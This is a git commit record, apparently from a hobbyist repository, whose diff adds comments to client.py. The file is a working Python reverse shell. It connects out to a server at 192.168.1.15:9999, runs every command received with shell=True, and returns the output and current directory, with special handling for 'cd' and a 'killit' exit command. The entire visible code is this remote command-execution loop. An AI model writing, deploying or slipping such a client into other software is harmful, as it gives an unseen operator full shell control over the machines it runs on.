fe117e001f9cda8cafa56b00a89fa4b1e53beb04
ProgRies <cpries94@gmail.com>
2017-01-01 21:31:21 -0500

    Added basic Comments
    I added some basic commends to the script using the Github interface and commit functionality

--- client.py
+++ client.py
@@ -4,13 +4,18 @@ import subprocess
 import sys
 
 
+# Initial creation of socket on the client device
+
 s = socket.socket()
 host = "192.168.1.15"
 port = 9999
 s.connect((host, port))
 
+# After client connects to listening server, it keeps looping to recieve commands from it and executes them
+
 while True:
     data = s.recv(1024)
+    # 'cd' is a special case that needs to be handled properly to keep functionality and transmission stable
     if data[:].decode("utf-8") == "cd":
         try:
             os.chdir(os.path.dirname(sys.argv[0]))
@@ -21,15 +26,17 @@ while True:
             os.chdir(data[3:].decode("utf-8"))
         except OSError:
             s.send("Directory does not exist: " + str.encode(str(OSError) + str(os.getcwd()) + "> "))
-
+    # Check is command is not 'cd' and more than 0 bytes,
+    # This shouldn't fail because the server already has a check set up for this
     if len(data) > 0:
         cmd = subprocess.Popen(data[:].decode("utf-8"), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
         output_bytes = cmd.stdout.read() + cmd.stderr.read()
         output_str = str(output_bytes)
         s.send(str.encode(output_str + "\n" + str(os.getcwd()) + "> "))
         print(output_str)
+    #Personalised kill command, can't use 'kill' because that's already used by linux based OS
     if data[:].decode("utf-8") == 'killit':
         s.close()
 
-# Closing Connection in case 'Kill' command wasn't issued
+# Closing Connection in case 'killit' command wasn't issued, otherwise unreachable
 s.close()
